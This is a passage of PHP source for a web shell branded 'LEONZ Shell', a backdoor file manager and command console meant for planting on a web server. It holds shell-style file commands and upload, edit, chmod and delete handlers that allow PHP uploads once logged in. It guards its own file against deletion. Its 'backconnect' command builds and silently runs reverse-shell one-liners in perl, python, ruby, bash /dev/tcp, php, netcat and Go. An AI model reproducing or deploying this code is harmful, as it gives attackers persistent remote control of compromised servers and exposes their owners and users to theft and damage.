                if (!is_dir($dst_dir) || !is_path_allowed($dst_dir, $root_dir)) {
                    return "cp: destination invalid or out-of-root\n";
                }
                $final_dst = $dst_dir . '/' . basename($args[1]);
                if (!@copy($src_real, $final_dst)) {
                    return "cp: failed to copy\n";
                }
                return "cp: copied to $final_dst\n";
            }

        case 'mv':
            if (count($args) < 2) {
                return "mv: usage: mv [source] [destination]\n";
            }
            $src = $current_dir . '/' . $args[0];
            $dst = $current_dir . '/' . $args[1];
            global $realpath_cache12;
            if (!isset($realpath_cache12[$src])) $realpath_cache12[$src] = realpath($src);
            $src_real = $realpath_cache12[$src];
            if (!$src_real || !file_exists($src_real) || !is_path_allowed($src_real, $root_dir)) {
                return "mv: source invalid or out-of-root\n";
            }
            if (!is_dir(dirname($dst)) || !is_path_allowed(dirname($dst), $root_dir)) {
                return "mv: destination invalid or out-of-root\n";
            }
            if (@rename($src_real, $dst)) {
                return "mv: moved to $args[1]\n";
            } else {
                return "mv: failed to move\n";
            }

        case 'grep':
            if (empty($args[0])) {
                return "grep: usage: grep [pattern] [file/dir]...\n";
            }
            $pattern = $args[0];
            $out = '';
            $files_searched = 0;
            $matches_found = 0;
            $targets = array_slice($args, 1);
            if (empty($targets)) $targets = [$current_dir];
            foreach ($targets as $tg) {
                $tp = $current_dir . '/' . $tg;
                global $realpath_cache13;
                if (!isset($realpath_cache13[$tp])) $realpath_cache13[$tp] = realpath($tp);
                $t = $realpath_cache13[$tp];
                if (!$t) continue;
                if (is_file($t)) {
                    if (!is_path_allowed($t, $root_dir)) continue;
                    $content = @file_get_contents($t);
                    if ($content === false) continue;
                    $lines = explode("\n", $content);
                    foreach ($lines as $ln => $line) {
                        if (stripos($line, $pattern) !== false) {
                            $matches_found++;
                            $out .= "{$t}:" . ($ln + 1) . ": " . $line . "\n";
                            if ($matches_found >= 100) {
                                $out .= "... (truncated, more matches)\n";
                                break 2;
                            }
                        }
                    }
                    $files_searched++;
                } elseif (is_dir($t)) {
                    if (!is_path_allowed($t, $root_dir)) continue;
                    $sub_files = glob($t . '/*');
                    if ($sub_files) {
                        foreach ($sub_files as $sf) {
                            if (is_file($sf) && is_path_allowed($sf, $root_dir)) {
                                $content = @file_get_contents($sf);
                                if ($content !== false) {
                                    $lines = explode("\n", $content);
                                    foreach ($lines as $ln => $line) {
                                        if (stripos($line, $pattern) !== false) {
                                            $matches_found++;
                                            $out .= "$sf:" . ($ln + 1) . ": " . $line . "\n";
                                            if ($matches_found >= 100) {
                                                $out .= "... (truncated)\n";
                                                break 3;
                                            }
                                        }
                                    }
                                }
                                $files_searched++;
                            }
                        }
                    }
                }
            }
            $summary = "Searched $files_searched file(s), found $matches_found match(es).\n";
            return $out . $summary;

        case 'tree':
            $root = $current_dir;
            if (!empty($args[0])) {
                global $realpath_cache14;
                if (!isset($realpath_cache14[$args[0]])) $realpath_cache14[$args[0]] = realpath($args[0]);
                $rt = $realpath_cache14[$args[0]];
                if ($rt && is_path_allowed($rt, $root_dir)) $root = $rt;
            }
            $indent = '';
            $out = '';
            $callback = function($dir, $indent) use (&$callback, &$out, $root_dir) {
                $files = @scandir($dir);
                if ($files === false) return;
                $entries = [];
                foreach ($files as $f) {
                    if ($f === '.' || $f === '..') continue;
                    $full = $dir . DIRECTORY_SEPARATOR . $f;
                    if (is_path_allowed($full, $root_dir)) {
                        $entries[] = $f;
                    }
                }
                natcasesort($entries);
                $count = count($entries);
                $i = 0;
                foreach ($entries as $entry) {
                    $full = $dir . DIRECTORY_SEPARATOR . $entry;
                    $isLast = (++$i === $count);
                    $connector = $isLast ? '└── ' : '├── ';
                    $out .= $indent . $connector . $entry . "\n";
                    if (is_dir($full)) {
                        $extension = $isLast ? '    ' : '│   ';
                        $callback($full, $indent . $extension);
                    }
                }
            };
            $callback($root, '');
            return $out ?: "(empty directory)\n";

        case 'find':
            if (empty($args[0])) {
                return "find: usage: find [pattern] [--name] [--type file|dir] [--maxdepth N]\n";
            }
            $pattern = $args[0];
            $name_mode = false;
            $type_mode = null;
            $max_depth = -1;
            $i = 1;
            while ($i < count($args)) {
                if ($args[$i] === '--name') $name_mode = true;
                elseif ($args[$i] === '--type' && isset($args[$i+1])) {
                    $type_mode = $args[$i+1];
                    $i++;
                } elseif ($args[$i] === '--maxdepth' && isset($args[$i+1])) {
                    $max_depth = intval($args[$i+1]);
                    $i++;
                }
                $i++;
            }
            $found = [];
            $queue = [$current_dir => 0];
            while ($queue) {
                $dir = key($queue);
                $depth = current($queue);
                unset($queue[$dir]);
                if ($max_depth >= 0 && $depth > $max_depth) continue;
                $dh = @opendir($dir);
                if (!$dh) continue;
                while (($entry = @readdir($dh)) !== false) {
                    if ($entry === '.' || $entry === '..') continue;
                    $full = $dir . DIRECTORY_SEPARATOR . $entry;
                    $match = false;
                    if ($name_mode) {
                        if (fnmatch($pattern, $entry)) $match = true;
                    } else {
                        if (stripos($entry, $pattern) !== false) $match = true;
                    }
                    if ($match) {
                        if ($type_mode === 'file' && !is_file($full)) continue;
                        if ($type_mode === 'dir' && !is_dir($full)) continue;
                        if (is_path_allowed($full, $root_dir)) {
                            $found[] = $full;
                        }
                    }
                    if (is_dir($full) && is_path_allowed($full, $root_dir)) {
                        $queue[$full] = $depth + 1;
                    }
                }
                @closedir($dh);
            }
            if (empty($found)) return "find: no results\n";
            $out = implode("\n", $found) . "\n";
            return $out;

        case 'whoami':
            return (get_current_user() ?: $_SERVER['USER'] ?? $_SERVER['USERNAME'] ?? 'www-data') . "\n";

        case 'id':
            $u = get_current_user() ?: 'www-data';
            $g = posix_getgrgid(posix_getgid());
            return "uid=$u gid=" . ($g ? $g['name'] : 'www-data') . " groups=$u\n";

        case 'uname':
            $out = 'Linux';
            if (PHP_OS_FAMILY === 'Windows') $out = 'Windows';
            $out .= ' ' . PHP_OS;
            if (!empty($args[0]) && $args[0] === '-a') {
                $out .= "\nRelease: " . php_uname('r') . "\nMachine: " . php_uname('m') . "\n";
            }
            return $out . "\n";

        case 'uptime':
            $stat = @stat(__FILE__);
            if ($stat) {
                $secs = time() - $stat['ctime'];
                $days = floor($secs / 86400);
                $hrs = floor(($secs % 86400) / 3600);
                $mins = floor(($secs % 3600) / 60);
                return "up $days days, $hrs:$mins, " . formatMemory(@disk_free_space($current_dir)) . " free\n";
            }
            return "uptime: unavailable\n";

        case 'date':
            return date('Y-m-d H:i:s T') . "\n";

        case 'du':
            $target = $current_dir;
            $max_depth_arg = null;
            foreach ($args as $a) {
                if (is_numeric($a)) $max_depth_arg = intval($a);
            }
            if (!empty($args[0])) {
                global $realpath_cache15;
                if (!isset($realpath_cache15[$args[0]])) $realpath_cache15[$args[0]] = realpath($args[0]);
                $t = $realpath_cache15[$args[0]];
                if ($t && is_path_allowed($t, $root_dir)) $target = $t;
            }
            $total = 0;
            $queue2 = [$target => 0];
            while ($queue2) {
                $dir = key($queue2);
                $depth = current($queue2);
                unset($queue2[$dir]);
                if ($max_depth_arg !== null && $depth > $max_depth_arg) continue;
                $dh = @opendir($dir);
                if (!$dh) continue;
                while (($entry = @readdir($dh)) !== false) {
                    if ($entry === '.' || $entry === '..') continue;
                    $full = $dir . DIRECTORY_SEPARATOR . $entry;
                    if (is_path_allowed($full, $root_dir)) {
                        if (is_file($full)) {
                            $total += @filesize($full) ?: 0;
                        } elseif (is_dir($full)) {
                            $queue2[$full] = $depth + 1;
                        }
                    }
                }
                @closedir($dh);
            }
            return formatMemory($total) . "  $target\n";

        case 'file':
            if (empty($args[0])) {
                return "file: usage: file [filename]\n";
            }
            $fp = $current_dir . '/' . $args[0];
            global $realpath_cache16;
            if (!isset($realpath_cache16[$fp])) $realpath_cache16[$fp] = realpath($fp);
            $f = $realpath_cache16[$fp];
            if (!$f || !is_file($f) || !is_path_allowed($f, $root_dir)) {
                return "file: invalid or out-of-root file\n";
            }
            $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
            $size = formatFileSize(@filesize($f));
            $perms = substr(sprintf('%o', @fileperms($f)), -4);
            return "$f: $size, permissions $perms, extension .$ext\n";

        case 'stat':
            if (empty($args[0])) {
                return "stat: usage: stat [file]\n";
            }
            $sp = $current_dir . '/' . $args[0];
            global $realpath_cache17;
            if (!isset($realpath_cache17[$sp])) $realpath_cache17[$sp] = realpath($sp);
            $s = $realpath_cache17[$sp];
            if (!$s || !is_file($s) || !is_path_allowed($s, $root_dir)) {
                return "stat: invalid or out-of-root file\n";
            }
            $st = @stat($s);
            if (!$st) return "stat: cannot stat file\n";
            $out = "File: $s\n";
            $out .= "Size: " . formatFileSize($st['size']) . "\n";
            $out .= "Permissions: " . substr(sprintf('%o', $st['mode']), -4) . "\n";
            $out .= "Created: " . date('Y-m-d H:i:s', $st['ctime']) . "\n";
            $out .= "Modified: " . date('Y-m-d H:i:s', $st['mtime']) . "\n";
            $out .= "Accessed: " . date('Y-m-d H:i:s', $st['atime']) . "\n";
            $out .= "Owner: " . (get_current_user() ?: 'www-data') . "\n";
            return $out;

        case 'base64':
            if (empty($args[0])) {
                return "base64: usage: base64 [file] [--decode]\n";
            }
            $decode = in_array('--decode', $args, true);
            $bp = $current_dir . '/' . $args[0];
            global $realpath_cache18;
            if (!isset($realpath_cache18[$bp])) $realpath_cache18[$bp] = realpath($bp);
            $b = $realpath_cache18[$bp];
            if (!$b || !is_file($b) || !is_path_allowed($b, $root_dir)) {
                return "base64: invalid or out-of-root file\n";
            }
            $data = @file_get_contents($b);
            if ($data === false) return "base64: cannot read file\n";
            if ($decode) {
                $result = base64_decode($data, true);
                if ($result === false) return "base64: invalid base64 data\n";
                return $result;
            } else {
                return chunk_split(base64_encode($data), 76) . "\n";
            }
            if (!isset($_SESSION['loggedin'])) {
                return "backconnect: authentication required\n";
            }
            if (empty($args[0]) || empty($args[1])) {
                return "backconnect: usage: backconnect [method] [host] [port]\n".
                       "Methods: perl, python, ruby, bash, php, nc, sh, xterm, golang\n".
                       "Example: backconnect perl 192.168.1.100 4444\n";
            }
            $method = strtolower($args[0]);
            $host = $args[1];
            $port = isset($args[2]) ? intval($args[2]) : 4444;
            
            $is_valid_ip = filter_var($host, FILTER_VALIDATE_IP) !== false;
            $is_valid_domain = (function_exists('filter_var') && defined('FILTER_VALIDATE_DOMAIN')) 
                ? filter_var($host, FILTER_VALIDATE_DOMAIN) !== false 
                : preg_match('/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i', $host);
            if (!$is_valid_ip && !$is_valid_domain) {
                return "backconnect: invalid host address\n";
            }
            if ($port < 1 || $port > 65535) {
                return "backconnect: invalid port (1-65535)\n";
            }
            
            $cmd = '';
            switch ($method) {
                case 'perl':
                    $cmd = 'perl -e \'use Socket;$i="' . $host . '";$p=' . $port . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';
                    break;
                case 'python':
                    $cmd = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $host . '",' . $port . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
                    break;
                case 'ruby':
                    $cmd = 'ruby -rsocket -e\'f=TCPSocket.open("' . $host . '",' . $port . ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'';
                    break;
                case 'bash':
                    $cmd = 'bash -i >& /dev/tcp/' . $host . '/' . $port . ' 0>&1';
                    break;
                case 'php':
                    $cmd = 'php -r \'$sock=fsockopen("' . $host . '",' . $port . ');$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);proc_close($proc);\'';
                    break;
                case 'nc':
                case 'netcat':
                    $cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $host . ' ' . $port . ' >/tmp/f';
                    break;
                case 'sh':
                    $cmd = 'sh -i >& /dev/tcp/' . $host . '/' . $port . ' 0>&1';
                    break;
                case 'xterm':
                    $cmd = 'xterm -display ' . $host . ':' . $port;
                    break;
                case 'golang':
                case 'go':
                    $cmd = 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' . $host . ':' . $port . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go';
                    break;
                default:
                    return "backconnect: unknown method '$method'\nAvailable: perl, python, ruby, bash, php, nc, sh, xterm, golang\n";
            }
            
            if (!empty($cmd)) {
                $output = leonz_exec_cmd($cmd . ' 2>&1 &');
                return "backconnect: attempting reverse shell connection...\nMethod: $method\nHost: $host\nPort: $port\nCommand executed in background.\n";
            }
            return "backconnect: failed to generate command\n";

        default:
            return "Unknown command: $base\nType 'help' for available commands.\n";
    }
}

$shell_output = '';
if (isset($_POST['run_cmd'])) {
    $command_input = $_POST['command_line'] ?? '';
    $shell_output  = handle_shell_command($command_input, $current_dir, $root_dir, $script_path);
}

if (isset($_POST['quick_cmd'])) {
    $quick_cmd = $_POST['quick_cmd'] ?? '';
    $cmd_args = $_POST['cmd_args'] ?? '';
    $full_cmd = $quick_cmd;
    if (!empty($cmd_args)) {
        $full_cmd .= ' ' . $cmd_args;
    }
    $shell_output = handle_shell_command($full_cmd, $current_dir, $root_dir, $script_path);
}

if (isset($_GET['delete'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: delete blocked.');
    }
    global $realpath_cache, $script_path, $script_dir;
    $test_path = $current_dir . '/' . $_GET['delete'];
    if (!isset($realpath_cache[$test_path])) {
        $realpath_cache[$test_path] = realpath($test_path);
    }
    $target = $realpath_cache[$test_path];
    if ($target && is_path_allowed($target, $root_dir)) {
        $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);

        if (!$bypass_active && $script_path && $target === $script_path) {
            http_response_code(403);
            exit('Shell protection: delete blocked. Use bypass to enable deletion.');
        }

        $shell_dir_real = $script_dir ? (realpath($script_dir) ?: $script_dir) : null;
        $target_real = realpath($target) ?: $target;
        if (!$bypass_active && $shell_dir_real && is_dir($target) && $target_real === $shell_dir_real) {
            http_response_code(403);
            exit('Shell protection: delete blocked for shell directory. Use bypass to enable deletion.');
        }

        if (is_protected_root_directory($target) && !$bypass_active) {
            http_response_code(403);
            exit('Protected root directory: delete blocked. Use bypass to enable deletion.');
        }

        if (is_protected_json_file($target) && !$bypass_active) {
            http_response_code(403);
            exit('System protection: Cannot delete protected system files (leonz_protected_root.json, leonz_bypass_state.json). Use bypass to enable deletion.');
        }

        if (is_shell_in_protected_root($target)) {
            http_response_code(403);
            exit('Shell protection: Cannot delete shell file/folder when custom root is active. Shell is protected in custom root directory.');
        }

        if (is_file($target)) {
            @unlink($target);
        } elseif (is_dir($target)) {
            $it    = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($files as $file) {
                $file->isDir() ? @rmdir($file->getRealPath()) : @unlink($file->getRealPath());
            }
            @rmdir($target);
        }
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['extract'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: extract blocked.');
    }
    global $realpath_cache;
    $test_path = $current_dir . DIRECTORY_SEPARATOR . $_GET['extract'];
    if (!isset($realpath_cache[$test_path])) {
        $realpath_cache[$test_path] = realpath($test_path);
    }
    $zip_path = $realpath_cache[$test_path];
    $dest_dir = $current_dir;
    $redirect = "?dir=" . urlencode($current_dir);
    if (!$zip_path || !is_path_allowed($zip_path, $root_dir) || !is_path_allowed($dest_dir, $root_dir)) {
        header("Location: " . $redirect . "&extract_error=" . urlencode('Invalid or out-of-root path'));
        exit;
    }
    if (!is_file($zip_path)) {
        header("Location: " . $redirect . "&extract_error=" . urlencode('Extract only works on archive files (.zip, .tar, .gz, .rar, .7z)'));
        exit;
    }
    if (!leonz_is_extractable_archive($zip_path)) {
        header("Location: " . $redirect . "&extract_error=" . urlencode('File is not a supported archive. Currently extract supports .zip'));
        exit;
    }
    $result = leonz_extract_zip_archive($zip_path, $dest_dir);
    if ($result['ok']) {
        header("Location: " . $redirect . "&extract_success=" . urlencode($result['msg']));
    } else {
        header("Location: " . $redirect . "&extract_error=" . urlencode($result['msg']));
    }
    exit;
}

$rename_item = null;
if (isset($_POST['rename_file'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: rename blocked.');
    }
    $old_raw = $_POST['old_name'] ?? '';
    $new_raw = $_POST['new_name'] ?? '';
    global $realpath_cache, $script_path, $script_dir;
    $test_path = $current_dir . '/' . $old_raw;
    if (!isset($realpath_cache[$test_path])) {
        $realpath_cache[$test_path] = realpath($test_path);
    }
    $old = $realpath_cache[$test_path];
    $new = $current_dir . '/' . basename($new_raw);

    if ($old && is_path_allowed($old, $root_dir)) {
        $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
        $shell_dir_real = $script_dir ? (realpath($script_dir) ?: $script_dir) : null;
        
        if (!$bypass_active) {
            if ($script_path && $old === $script_path) {
                http_response_code(403);
                exit('Shell protection: rename blocked. Use bypass to enable rename.');
            }
            if ($shell_dir_real && is_dir($old) && realpath($old) === $shell_dir_real) {
                http_response_code(403);
                exit('Shell protection: rename blocked for shell directory. Use bypass to enable rename.');
            }
        }

        if (is_protected_root_directory($old) && !$bypass_active) {
            http_response_code(403);
            exit('Protected root directory: rename blocked. Use bypass to enable rename.');
        }

        if (is_protected_json_file($old) && !$bypass_active) {
            http_response_code(403);
            exit('System protection: Cannot rename protected system files (leonz_protected_root.json, leonz_bypass_state.json). Use bypass to enable rename.');
        }

        if (is_shell_in_protected_root($old)) {
            http_response_code(403);
            exit('Shell protection: Cannot rename shell file/folder when custom root is active. Shell is protected in custom root directory.');
        }

        @rename($old, $new);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['rename']) && $access_mode === 'full') {
    $rename_item = htmlspecialchars($_GET['rename']);
}

$chmod_item = null;
if (isset($_GET['chmod']) && $access_mode === 'full') {
    $chmod_item = htmlspecialchars($_GET['chmod']);
}

if (isset($_POST['apply_chmod'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: chmod blocked.');
    }
    $target_name = $_POST['target_name'] ?? '';
    $mode_str    = $_POST['chmod_mode'] ?? '';
    
    if (!preg_match('/^[0-7]{3,4}$/', $mode_str)) {
        header("Location: ?dir=" . urlencode($current_dir) . "&chmod=" . urlencode($target_name) . "&error=invalid_mode");
        exit;
    }
    
    global $realpath_cache, $script_path, $script_dir;
    $test_path = $current_dir . '/' . $target_name;
    if (!isset($realpath_cache[$test_path])) {
        $realpath_cache[$test_path] = realpath($test_path);
    }
    $target = $realpath_cache[$test_path];
    if ($target && is_path_allowed($target, $root_dir) && file_exists($target)) {
        $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
        $shell_dir_real = $script_dir ? (realpath($script_dir) ?: $script_dir) : null;
        
        if (!$bypass_active) {
            if ($script_path && $target === $script_path) {
                http_response_code(403);
                exit('Shell protection: chmod blocked. Use bypass to enable chmod.');
            }
            if ($shell_dir_real && is_dir($target) && realpath($target) === $shell_dir_real) {
                http_response_code(403);
                exit('Shell protection: chmod blocked for shell directory. Use bypass to enable chmod.');
            }
        }

        if (is_protected_root_directory($target) && !$bypass_active) {
            http_response_code(403);
            exit('Protected root directory: chmod blocked. Use bypass to enable chmod.');
        }

        if (is_protected_json_file($target) && !$bypass_active) {
            http_response_code(403);
            exit('System protection: Cannot chmod protected system files (leonz_protected_root.json, leonz_bypass_state.json). Use bypass to enable chmod.');
        }

        if (is_shell_in_protected_root($target)) {
            http_response_code(403);
            exit('Shell protection: Cannot chmod shell file/folder when custom root is active. Shell is protected in custom root directory.');
        }

        $mode_octal = intval($mode_str, 8);
        @chmod($target, $mode_octal);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_POST['upload'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: upload blocked.');
    }
    if (!isset($_FILES['files']['name']) || empty($_FILES['files']['name'][0])) {
        $error_msg = 'Upload failed: No file selected.';
    } else {
        $first_error = null;
        $success_count = 0;
        $uploaded_names = [];
        $names     = $_FILES['files']['name'];
        $tmp_names = $_FILES['files']['tmp_name'];
        $sizes     = $_FILES['files']['size'];
        $uferrors  = $_FILES['files']['error'];
        $count     = count($names);
        for ($i = 0; $i < $count; $i++) {
            if (empty($names[$i])) continue;
            $file_name = basename($names[$i]);
            $target    = $current_dir . '/' . $file_name;

            global $realpath_cache;
            $target_dir_key = dirname($target);
            if (!isset($realpath_cache[$target_dir_key])) {
                $realpath_cache[$target_dir_key] = realpath($target_dir_key) ?: $target_dir_key;
            }
            $target_dir = $realpath_cache[$target_dir_key];

            if (!is_dir($target_dir) || !is_writable($target_dir)) {
                if (!$first_error) $first_error = 'Upload failed: Target directory is not writable or does not exist (' . $file_name . ').';
                continue;
            }
            if (!is_path_allowed($target_dir, $root_dir)) {
                if (!$first_error) $first_error = 'Upload failed: Target path is outside allowed root directory (' . $file_name . ').';
                continue;
            }

            $ext     = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
            $blocked = ['php', 'phtml', 'phar', 'htaccess', 'ini', 'cgi', 'pl'];

            $is_logged_in  = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
            $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
            $allow_php     = $is_logged_in || $bypass_active;

            $is_blocked_ext = in_array($ext, $blocked, true);
            $file_size_ok   = isset($sizes[$i]) && $sizes[$i] > 0 && $sizes[$i] < 10 * 1024 * 1024;

            if (!isset($tmp_names[$i]) || !is_uploaded_file($tmp_names[$i])) {
                if (!$first_error) $first_error = 'Upload failed: Invalid file upload (' . $file_name . ').';
                continue;
            } elseif ($is_blocked_ext && !$allow_php) {
                if (!$first_error) $first_error = 'Upload blocked: PHP and executable files are not allowed. Login or enable bypass to upload PHP files.';
                continue;
            } elseif (!$file_size_ok) {
                if (!isset($sizes[$i]) || $sizes[$i] == 0) {
                    if (!$first_error) $first_error = 'Upload failed: File is empty or upload failed (' . $file_name . ').';
                } else {
                    if (!$first_error) $first_error = 'Upload blocked: File size exceeds 10MB limit (' . $file_name . ').';
                }
                continue;
            } elseif (($allow_php || !$is_blocked_ext) && $file_size_ok) {
                if (!is_path_allowed($target, $root_dir)) {
                    if (!$first_error) $first_error = 'Upload failed: Target file path is outside allowed root directory (' . $file_name . ').';
                    continue;
                } else {
                    $upload_result = @move_uploaded_file($tmp_names[$i], $target);
                    if (!$upload_result) {
                        if (!$first_error) {
                            if (!empty($uferrors[$i])) {
                                $first_error = 'Upload failed. Error code: ' . $uferrors[$i] . ' (' . $file_name . ')';
                            } else {
                                $first_error = 'Upload failed: Could not move uploaded file. Check directory permissions (' . $file_name . ')';
                            }
                        }
                    } else {
                        $success_count++;
                        $uploaded_names[] = $file_name;
                    }
                }
            }
        }

        if ($success_count > 0) {
            $redirect_url = "?dir=" . urlencode($current_dir) . "&upload_success=" . urlencode(implode(', ', $uploaded_names));
            if ($first_error) {
                $redirect_url .= "&upload_partial_error=" . urlencode('Some files failed.');
            }
            header("Location: " . $redirect_url);
            exit;
        } elseif ($first_error) {
            $error_msg = $first_error;
        } else {
            $error_msg = 'Upload failed: No valid files to upload.';
        }
    }
    $redirect_url = "?dir=" . urlencode($current_dir);
    if (isset($error_msg)) {
        $redirect_url .= "&upload_error=" . urlencode($error_msg);
    }
    header("Location: " . $redirect_url);
    exit;
}

$edit_file    = null;
$file_content = null;

if (isset($_POST['save_edit'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: edit blocked.');
    }
    $file_name = $_POST['file_name'] ?? '';
    global $realpath_cache, $script_path, $script_dir;
    $test_path = $current_dir . '/' . $file_name;
    if (!isset($realpath_cache[$test_path])) {
        $realpath_cache[$test_path] = realpath($test_path);
    }
    $file_to_edit = $realpath_cache[$test_path];
    if ($file_to_edit && is_path_allowed($file_to_edit, $root_dir) && is_file($file_to_edit)) {
        $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
        
        if (!$bypass_active && $script_path && $file_to_edit === $script_path) {
            http_response_code(403);
            exit('Shell protection: edit blocked. Use bypass to enable editing.');
        }

        if (is_protected_root_directory($file_to_edit) && !$bypass_active) {
            http_response_code(403);
            exit('Protected root directory: edit blocked. Use bypass to enable editing.');
        }

        if (is_protected_json_file($file_to_edit) && !$bypass_active) {
            http_response_code(403);
            exit('System protection: Cannot edit protected system files (leonz_protected_root.json, leonz_bypass_state.json). Use bypass to enable editing.');
        }

        if (is_shell_in_protected_root($file_to_edit)) {
            http_response_code(403);
            exit('Shell protection: Cannot edit shell file/folder when custom root is active. Shell is protected in custom root directory.');
        }

        @file_put_contents($file_to_edit, $_POST['file_content'] ?? '');
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['edit'])) {
    global $realpath_cache, $script_path, $script_dir;
    $test_path = $current_dir . '/' . $_GET['edit'];
    if (!isset($realpath_cache[$test_path])) {
        $realpath_cache[$test_path] = realpath($test_path);
    }
    $edit_file_path = $realpath_cache[$test_path];
    if ($edit_file_path && is_file($edit_file_path)) {
        $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
        
        if (is_protected_json_file($edit_file_path) && !$bypass_active) {
            http_response_code(403);
            exit('System protection: Cannot edit protected system files (leonz_protected_root.json, leonz_bypass_state.json). Use bypass to enable editing.');
        }
        
        if (!$bypass_active && $script_path && $edit_file_path === $script_path) {
            http_response_code(403);
            exit('Shell protection: edit blocked. Use bypass to enable editing.');
        }
        
        if (is_protected_root_directory($edit_file_path) && !$bypass_active) {
            http_response_code(403);
            exit('Protected root directory: edit blocked. Use bypass to enable editing.');
        }
        
        if (is_shell_in_protected_root($edit_file_path)) {
            http_response_code(403);
            exit('Shell protection: Cannot edit shell file/folder when custom root is active. Shell is protected in custom root directory.');
        }
        
        $edit_file    = $_GET['edit'];
        $file_content = htmlspecialchars(@file_get_contents($edit_file_path), ENT_QUOTES, 'UTF-8');
    }
}

if (isset($_POST['create_file'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: create file blocked.');
    }
    $new_raw = $_POST['new_file_name'] ?? '';
    $new     = $current_dir . '/' . basename($new_raw);
    if (!file_exists($new)) {
        @file_put_contents($new, "");
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_POST['create_folder'])) {
    if ($access_mode === 'read_only') {
        http_response_code(403);
        exit('Read-only mode: create folder blocked.');
    }
    $new_raw = $_POST['new_folder_name'] ?? '';
    $new     = $current_dir . '/' . basename($new_raw);
    if (!file_exists($new)) {
        @mkdir($new);
    }
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

$server_user = get_current_user() ?: ($_SERVER['USER'] ?? $_SERVER['USERNAME'] ?? 'root');
$server_host = gethostname() ?: ($_SERVER['SERVER_NAME'] ?? 'server');

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LEONZ Shell</title>
    <style>
        body {
            background: radial-gradient(circle at top, #7b0022 0, #050308 55%, #000 100%);
            color:#f8f4f0;
            font-family:Consolas,monospace;
            margin:0;
            padding:15px 20px 40px;
        }
        .header {
            display:flex;
            justify-content:space-between;
            align-items:flex-start;
            border-bottom:1px solid rgba(212,175,55,0.4);
            padding-bottom:10px;
            margin-bottom:10px;
        }
        .brand {
            display:flex;
            gap:12px;
        }
        .logo-text {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .logo-leonz {
            font-size: 53px;
            font-weight: 900;
            font-family: 'Arial Black', 'Impact', sans-serif;
            color: #ff0000;
            text-shadow: 
                -1px 1px 0 #d5d53c,
                3px -3px 5px #fdfdfd,
                -3px 3px 0 #1e1e1e,
                3px 3px 0 #8b887b,
                0 0 20px #3d3936,
                5px 5px 0 rgba(0, 0, 0, 0.9),
                6px 6px 0 rgba(0, 0, 0, 0.9),
                4px 4px 12px rgba(0, 0, 0, 0.8);
            letter-spacing: 4px;
            margin: 0;
            line-height: 1;
            text-transform: uppercase;
        }
        .logo-subtitle {
            font-size: 16px;
            font-weight: 700;
            font-family: 'Courier New', monospace;
            color: #000000;
            text-shadow: 
                -1px -1px 0 #ffd700,
                1px -1px 0 #ffd700,
                -1px 1px 0 #ffd700,
                1px 1px 0 #ffd700,
                0 0 5px #ffd700,
                2px 2px 6px rgba(0, 0, 0, 0.8);
            letter-spacing: 2px;
            margin: 0;
            line-height: 1.2;
            text-transform: uppercase;
            image-rendering: pixelated;
            image-rendering: -moz-crisp-edges;
            image-rendering: crisp-edges;
        }
        h2 {
            margin:0;
            font-size:22px;
            letter-spacing:1px;
            text-transform:uppercase;
            color:#d4af37;
        }
        .subtitle { font-size:11px; opacity:0.8; }
        button,input,textarea {
            background:#11050b;
            color:#f8f4f0;
            border:1px solid #d4af37;
            padding:5px 8px;
            border-radius:6px;
        }
        button {
            cursor:pointer;
            text-transform:uppercase;
            font-size:11px;
            letter-spacing:1px;
        }
        button:hover {
            background:#d4af37;
            color:#050308;
        }
        a {
            color:#ffd166;
            text-decoration:none;
        }
